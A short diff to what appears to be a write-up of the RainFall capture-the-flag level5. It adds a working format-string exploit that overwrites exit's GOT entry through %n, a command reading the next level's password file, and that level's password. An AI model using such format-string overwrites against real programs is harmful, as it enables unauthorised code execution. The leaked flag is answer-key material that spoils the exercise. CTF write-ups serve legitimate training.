@@ -49,6 +49,12 @@ call o from n <===> ovveride exit (0x8049838) of by addr of o (0x080484a4)
 
  (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n" '; cat) | ./level5
  
+ ```
+ level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"'; cat -) | ./level5 > /dev/null
+cat /home/user/level6/.pass 1>&2
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+ ```
+ 
 
 
 
